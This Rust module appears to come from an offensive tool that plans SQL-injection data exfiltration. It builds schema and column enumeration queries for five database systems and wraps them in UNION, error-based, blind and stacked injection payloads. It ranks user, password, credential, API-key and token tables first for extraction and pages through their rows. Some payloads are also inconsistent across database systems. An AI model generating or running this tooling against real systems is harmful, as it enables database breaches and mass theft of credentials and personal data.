/// Database extraction planner for SQL injection post-exploitation.
///
/// Given a confirmed SQL injection vulnerability, plans systematic data
/// extraction from the target database: schema enumeration, table
/// prioritization, sampling strategies, and per-table extraction queries
/// wrapped in the appropriate injection technique.
use std::fmt;

/// Database management system type.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum DbmsType {
    MySql,
    PostgreSql,
    MsSql,
    Oracle,
    Sqlite,
}

impl fmt::Display for DbmsType {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            DbmsType::MySql => write!(f, "MySQL"),
            DbmsType::PostgreSql => write!(f, "PostgreSQL"),
            DbmsType::MsSql => write!(f, "MSSQL"),
            DbmsType::Oracle => write!(f, "Oracle"),
            DbmsType::Sqlite => write!(f, "SQLite"),
        }
    }
}

/// SQL injection technique available at the injection point.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum SqliTechnique {
    UnionBased,
    ErrorBased,
    BlindBoolean,
    BlindTime,
    Stacked,
}

impl fmt::Display for SqliTechnique {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            SqliTechnique::UnionBased => write!(f, "union-based"),
            SqliTechnique::ErrorBased => write!(f, "error-based"),
            SqliTechnique::BlindBoolean => write!(f, "blind-boolean"),
            SqliTechnique::BlindTime => write!(f, "blind-time"),
            SqliTechnique::Stacked => write!(f, "stacked"),
        }
    }
}

/// Simplified column data type for extraction planning.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ColumnType {
    Integer,
    Text,
    Blob,
    DateTime,
    Boolean,
    Numeric,
    Unknown,
}

impl fmt::Display for ColumnType {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            ColumnType::Integer => write!(f, "integer"),
            ColumnType::Text => write!(f, "text"),
            ColumnType::Blob => write!(f, "blob"),
            ColumnType::DateTime => write!(f, "datetime"),
            ColumnType::Boolean => write!(f, "boolean"),
            ColumnType::Numeric => write!(f, "numeric"),
            ColumnType::Unknown => write!(f, "unknown"),
        }
    }
}

/// Discovered database column.
#[derive(Debug, Clone)]
pub struct DbColumn {
    pub name: String,
    pub column_type: ColumnType,
    pub is_nullable: bool,
    pub is_key: bool,
}

/// Discovered table with its columns and extraction metadata.
#[derive(Debug, Clone)]
pub struct DbTable {
    pub schema_name: String,
    pub table_name: String,
    pub columns: Vec<DbColumn>,
    pub estimated_row_count: Option<u64>,
    pub priority: TablePriority,
}

/// Priority for extracting a table, ordered from most to least urgent.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum TablePriority {
    Critical,
    High,
    Medium,
    Low,
    Skip,
}

impl fmt::Display for TablePriority {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            TablePriority::Critical => write!(f, "critical"),
            TablePriority::High => write!(f, "high"),
            TablePriority::Medium => write!(f, "medium"),
            TablePriority::Low => write!(f, "low"),
            TablePriority::Skip => write!(f, "skip"),
        }
    }
}

/// Extraction strategy for a single table.
#[derive(Debug, Clone)]
pub struct TableExtractionPlan {
    pub table: DbTable,
    pub technique: SqliTechnique,
    pub queries: Vec<ExtractionQuery>,
    pub sampling_strategy: SamplingStrategy,
    pub estimated_queries: usize,
    pub estimated_time_ms: u64,
}

/// A single SQL extraction query ready for injection.
#[derive(Debug, Clone)]
pub struct ExtractionQuery {
    pub description: String,
    pub payload: String,
    pub query_type: QueryType,
    pub expected_columns: usize,
}

/// Type of extraction query.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum QueryType {
    SchemaEnumeration,
    RowCount,
    DataExtraction,
    ColumnEnumeration,
    VersionFingerprint,
}

impl fmt::Display for QueryType {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            QueryType::SchemaEnumeration => write!(f, "schema-enumeration"),
            QueryType::RowCount => write!(f, "row-count"),
            QueryType::DataExtraction => write!(f, "data-extraction"),
            QueryType::ColumnEnumeration => write!(f, "column-enumeration"),
            QueryType::VersionFingerprint => write!(f, "version-fingerprint"),
        }
    }
}

/// How to sample data from large tables.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum SamplingStrategy {
    Full,
    LimitOffset,
    RandomSample,
    HeadTail,
    KeyBased,
}

impl fmt::Display for SamplingStrategy {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            SamplingStrategy::Full => write!(f, "full"),
            SamplingStrategy::LimitOffset => write!(f, "limit-offset"),
            SamplingStrategy::RandomSample => write!(f, "random-sample"),
            SamplingStrategy::HeadTail => write!(f, "head-tail"),
            SamplingStrategy::KeyBased => write!(f, "key-based"),
        }
    }
}

/// Master database extraction plan covering all tables.
#[derive(Debug, Clone)]
pub struct DbExfilPlan {
    pub dbms: DbmsType,
    pub technique: SqliTechnique,
    pub schema_queries: Vec<ExtractionQuery>,
    pub table_plans: Vec<TableExtractionPlan>,
    pub total_queries: usize,
    pub estimated_time_ms: u64,
    pub extraction_order: Vec<String>,
}

/// Configuration for the extraction planner.
#[derive(Debug, Clone)]
pub struct DbExfilConfig {
    pub dbms: DbmsType,
    pub technique: SqliTechnique,
    pub injection_point: String,
    pub max_rows_per_table: u64,
    pub sample_large_tables: bool,
    pub large_table_threshold: u64,
    pub columns_per_query: usize,
    pub parallel_tables: bool,
}

/// Errors produced by the extraction planner.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum DbExfilError {
    InvalidConfig(String),
    UnsupportedDbms(String),
    NoTablesFound,
    TechniqueNotApplicable(String),
}

impl fmt::Display for DbExfilError {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            DbExfilError::InvalidConfig(msg) => {
                write!(f, "invalid config: {msg}")
            }
            DbExfilError::UnsupportedDbms(msg) => {
                write!(f, "unsupported DBMS: {msg}")
            }
            DbExfilError::NoTablesFound => write!(f, "no tables found"),
            DbExfilError::TechniqueNotApplicable(msg) => {
                write!(f, "technique not applicable: {msg}")
            }
        }
    }
}

impl std::error::Error for DbExfilError {}

// =========================================================================
// Constants for table-name classification
// =========================================================================

const CRITICAL_TABLE_KEYWORDS: &[&str] = &[
    "user",
    "password",
    "credential",
    "api_key",
    "secret",
    "account",
    "admin",
];

const HIGH_TABLE_KEYWORDS: &[&str] = &[
    "session",
    "token",
    "role",
    "permission",
    "auth",
    "oauth",
    "acl",
    "privilege",
];

const LOW_TABLE_KEYWORDS: &[&str] = &[
    "log",
    "audit",
    "analytic",
    "metric",
    "stat",
    "migration",
    "changelog",
];

const SKIP_TABLE_KEYWORDS: &[&str] = &[
    "schema_migration",
    "flyway",
    "information_schema",
    "pg_",
    "sys.",
    "sqlite_",
];

/// Estimated milliseconds per query by injection technique.
const fn base_query_time_ms(technique: SqliTechnique) -> u64 {
    match technique {
        SqliTechnique::UnionBased => 200,
        SqliTechnique::ErrorBased => 300,
        SqliTechnique::BlindBoolean => 5_000,
        SqliTechnique::BlindTime => 15_000,
        SqliTechnique::Stacked => 250,
    }
}

// =========================================================================
// Public API
// =========================================================================

/// Generates queries to enumerate all tables in the target database.
pub fn generate_schema_enumeration(
    config: &DbExfilConfig,
) -> Result<Vec<ExtractionQuery>, DbExfilError> {
    validate_config(config)?;

    let raw_query = match config.dbms {
        DbmsType::MySql => {
            "SELECT table_name FROM information_schema.tables WHERE table_schema=database()"
        }
        DbmsType::PostgreSql => "SELECT tablename FROM pg_tables WHERE schemaname='public'",
        DbmsType::MsSql => "SELECT name FROM sys.tables",
        DbmsType::Oracle => "SELECT table_name FROM user_tables",
        DbmsType::Sqlite => "SELECT name FROM sqlite_master WHERE type='table'",
    };

    let payload = wrap_in_technique(
        raw_query,
        config.technique,
        &config.injection_point,
        config.columns_per_query,
    );

    Ok(vec![ExtractionQuery {
        description: format!(
            "Enumerate tables on {} via {}",
            config.dbms, config.technique
        ),
        payload,
        query_type: QueryType::SchemaEnumeration,
        expected_columns: 1,
    }])
}

/// Generates queries to enumerate columns of a specific table.
pub fn generate_column_enumeration(
    table_name: &str,
    config: &DbExfilConfig,
) -> Result<Vec<ExtractionQuery>, DbExfilError> {
    validate_config(config)?;

    let raw_query = match config.dbms {
        DbmsType::MySql => format!(
            "SELECT column_name,data_type FROM information_schema.columns WHERE table_name='{table_name}'"
        ),
        DbmsType::PostgreSql => format!(
            "SELECT column_name,data_type FROM information_schema.columns WHERE table_name='{table_name}'"
        ),
        DbmsType::MsSql => format!(
            "SELECT COLUMN_NAME,DATA_TYPE FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='{table_name}'"
        ),
        DbmsType::Oracle => format!(
            "SELECT column_name,data_type FROM all_tab_columns WHERE table_name=UPPER('{table_name}')"
        ),
        DbmsType::Sqlite => format!("PRAGMA table_info({table_name})"),
    };

    let payload = wrap_in_technique(
        &raw_query,
        config.technique,
        &config.injection_point,
        config.columns_per_query,
    );

    Ok(vec![ExtractionQuery {
        description: format!("Enumerate columns of '{}' on {}", table_name, config.dbms),
        payload,
        query_type: QueryType::ColumnEnumeration,
        expected_columns: 2,
    }])
}

/// Heuristic classification of a table name into an extraction priority.
pub fn classify_table_priority(table_name: &str) -> TablePriority {
    let lower = table_name.to_lowercase();

    if SKIP_TABLE_KEYWORDS.iter().any(|kw| lower.contains(kw)) {
        return TablePriority::Skip;
    }
    if CRITICAL_TABLE_KEYWORDS.iter().any(|kw| lower.contains(kw)) {
        return TablePriority::Critical;
    }
    if HIGH_TABLE_KEYWORDS.iter().any(|kw| lower.contains(kw)) {
        return TablePriority::High;
    }
    if LOW_TABLE_KEYWORDS.iter().any(|kw| lower.contains(kw)) {
        return TablePriority::Low;
    }
    TablePriority::Medium
}

/// Selects the sampling strategy for a table based on its estimated size.
pub fn select_sampling_strategy(
    estimated_rows: Option<u64>,
    max_rows: u64,
    large_threshold: u64,
) -> SamplingStrategy {
    match estimated_rows {
        None => SamplingStrategy::Full,
        Some(rows) if rows <= max_rows => SamplingStrategy::Full,
        Some(rows) if rows > large_threshold => SamplingStrategy::RandomSample,
        Some(_) => SamplingStrategy::LimitOffset,
    }
}

/// Plans the extraction of a single table.
pub fn plan_table_extraction(
    table: &DbTable,
    config: &DbExfilConfig,
) -> Result<TableExtractionPlan, DbExfilError> {
    validate_config(config)?;

    let sampling = select_sampling_strategy(
        table.estimated_row_count,
        config.max_rows_per_table,
        config.large_table_threshold,
    );

    let mut queries = Vec::new();

    queries.push(build_row_count_query(table, config));

    let extraction_queries = build_data_extraction_queries(table, config, sampling);
    let estimated_queries = 1 + extraction_queries.len();
    queries.extend(extraction_queries);

    let time_per_query = base_query_time_ms(config.technique);
    let estimated_time_ms = (estimated_queries as u64) * time_per_query;

    Ok(TableExtractionPlan {
        table: table.clone(),
        technique: config.technique,
        queries,
        sampling_strategy: sampling,
        estimated_queries,
        estimated_time_ms,
    })
}

/// Master extraction planner: enumerates schema, classifies tables, plans each
/// table, orders by priority, and sums estimated cost.
pub fn plan_database_extraction(
    tables: &[DbTable],
    config: &DbExfilConfig,
) -> Result<DbExfilPlan, DbExfilError> {
    validate_config(config)?;

    if tables.is_empty() {
        return Err(DbExfilError::NoTablesFound);
    }

    let schema_queries = generate_schema_enumeration(config)?;

    let mut sorted_tables: Vec<&DbTable> = tables.iter().collect();
    sorted_tables.sort_by_key(|t| t.priority);

    let mut table_plans = Vec::with_capacity(sorted_tables.len());
    for t in &sorted_tables {
        if t.priority == TablePriority::Skip {
            continue;
        }
        table_plans.push(plan_table_extraction(t, config)?);
    }

    let total_queries: usize = schema_queries.len()
        + table_plans
            .iter()
            .map(|p| p.estimated_queries)
            .sum::<usize>();
    let estimated_time_ms: u64 = table_plans.iter().map(|p| p.estimated_time_ms).sum::<u64>()
        + (schema_queries.len() as u64) * base_query_time_ms(config.technique);

    let extraction_order: Vec<String> = table_plans
        .iter()
        .map(|p| p.table.table_name.clone())
        .collect();

    Ok(DbExfilPlan {
        dbms: config.dbms,
        technique: config.technique,
        schema_queries,
        table_plans,
        total_queries,
        estimated_time_ms,
        extraction_order,
    })
}

/// Generates a DBMS version fingerprint query.
pub fn generate_version_fingerprint(dbms: DbmsType) -> ExtractionQuery {
    let raw = match dbms {
        DbmsType::MySql => "SELECT @@version",
        DbmsType::PostgreSql => "SELECT version()",
        DbmsType::MsSql => "SELECT @@version",
        DbmsType::Oracle => "SELECT banner FROM v$version WHERE ROWNUM=1",
        DbmsType::Sqlite => "SELECT sqlite_version()",
    };

    ExtractionQuery {
        description: format!("Fingerprint {} version", dbms),
        payload: raw.to_string(),
        query_type: QueryType::VersionFingerprint,
        expected_columns: 1,
    }
}

// =========================================================================
// Private helpers
// =========================================================================

fn validate_config(config: &DbExfilConfig) -> Result<(), DbExfilError> {
    if config.columns_per_query == 0 {
        return Err(DbExfilError::InvalidConfig(
            "columns_per_query must be >= 1".to_string(),
        ));
    }
    if config.injection_point.is_empty() {
        return Err(DbExfilError::InvalidConfig(
            "injection_point must not be empty".to_string(),
        ));
    }
    Ok(())
}

/// Wraps a raw SQL query in the appropriate injection technique.
fn wrap_in_technique(
    query: &str,
    technique: SqliTechnique,
    injection_point: &str,
    num_columns: usize,
) -> String {
    match technique {
        SqliTechnique::UnionBased => {
            let nulls = if num_columns > 1 {
                let padding: Vec<&str> = (1..num_columns).map(|_| "NULL").collect();
                format!(",{}", padding.join(","))
            } else {
                String::new()
            };
            format!("{injection_point}' UNION SELECT ({query}){nulls}-- -")
        }
        SqliTechnique::ErrorBased => {
            format!("{injection_point}' AND EXTRACTVALUE(1,CONCAT(0x7e,({query})))-- -")
        }
        SqliTechnique::BlindBoolean => {
            format!("{injection_point}' AND (SELECT CASE WHEN ({query}) THEN 1 ELSE 0 END)=1-- -")
        }
        SqliTechnique::BlindTime => {
            format!("{injection_point}' AND IF(({query}),SLEEP(2),0)-- -")
        }
        SqliTechnique::Stacked => {
            format!("{injection_point}'; {query}-- -")
        }
    }
}

fn build_row_count_query(table: &DbTable, config: &DbExfilConfig) -> ExtractionQuery {
    let raw = format!("SELECT COUNT(*) FROM {}", table.table_name);
    let payload = wrap_in_technique(
        &raw,
        config.technique,
        &config.injection_point,
        config.columns_per_query,
    );

    ExtractionQuery {
        description: format!("Count rows in '{}'", table.table_name),
        payload,
        query_type: QueryType::RowCount,
        expected_columns: 1,
    }
}

fn build_data_extraction_queries(
    table: &DbTable,
    config: &DbExfilConfig,
    sampling: SamplingStrategy,
) -> Vec<ExtractionQuery> {
    let col_names = extractable_column_names(table);
    if col_names.is_empty() {
        return Vec::new();
    }

    let cols_csv = col_names.join(",");
    let rows_to_extract = effective_row_limit(table, config, sampling);
    let page_size = config.max_rows_per_table.min(100);

    let pages = rows_to_extract.div_ceil(page_size);
    let mut queries = Vec::with_capacity(pages as usize);

    for page in 0..pages {
        let offset = page * page_size;
        let raw = build_page_query(
            &cols_csv,
            &table.table_name,
            config.dbms,
            sampling,
            page_size,
            offset,
        );
        let payload = wrap_in_technique(
            &raw,
            config.technique,
            &config.injection_point,
            config.columns_per_query,
        );
        queries.push(ExtractionQuery {
            description: format!(
                "Extract from '{}' page {} ({} sampling)",
                table.table_name, page, sampling
            ),
            payload,
            query_type: QueryType::DataExtraction,
            expected_columns: col_names.len(),
        });
    }

    queries
}

fn extractable_column_names(table: &DbTable) -> Vec<String> {
    table
        .columns
        .iter()
        .filter(|c| c.column_type != ColumnType::Blob)
        .map(|c| c.name.clone())
        .collect()
}

fn effective_row_limit(table: &DbTable, config: &DbExfilConfig, sampling: SamplingStrategy) -> u64 {
    match sampling {
        SamplingStrategy::Full => table
            .estimated_row_count
            .unwrap_or(config.max_rows_per_table),
        SamplingStrategy::RandomSample => config.max_rows_per_table.min(1000),
        _ => config.max_rows_per_table,
    }
}

fn build_page_query(
    cols_csv: &str,
    table_name: &str,
    dbms: DbmsType,
    sampling: SamplingStrategy,
    limit: u64,
    offset: u64,
) -> String {
    let order_clause = match sampling {
        SamplingStrategy::RandomSample => random_order_clause(dbms),
        _ => String::new(),
    };

    let limit_clause = match dbms {
        DbmsType::MySql | DbmsType::PostgreSql | DbmsType::Sqlite => {
            format!(" LIMIT {limit} OFFSET {offset}")
        }
        DbmsType::MsSql => {
            format!(" ORDER BY 1 OFFSET {offset} ROWS FETCH NEXT {limit} ROWS ONLY")
        }
        DbmsType::Oracle => {
            format!(" OFFSET {offset} ROWS FETCH NEXT {limit} ROWS ONLY")
        }
    };

    format!("SELECT {cols_csv} FROM {table_name}{order_clause}{limit_clause}")
}

fn random_order_clause(dbms: DbmsType) -> String {
    match dbms {
        DbmsType::MySql => " ORDER BY RAND()".to_string(),
        DbmsType::PostgreSql => " ORDER BY RANDOM()".to_string(),
        DbmsType::MsSql => " ORDER BY NEWID()".to_string(),
        DbmsType::Oracle => " ORDER BY DBMS_RANDOM.VALUE".to_string(),
        DbmsType::Sqlite => " ORDER BY RANDOM()".to_string(),
    }
}
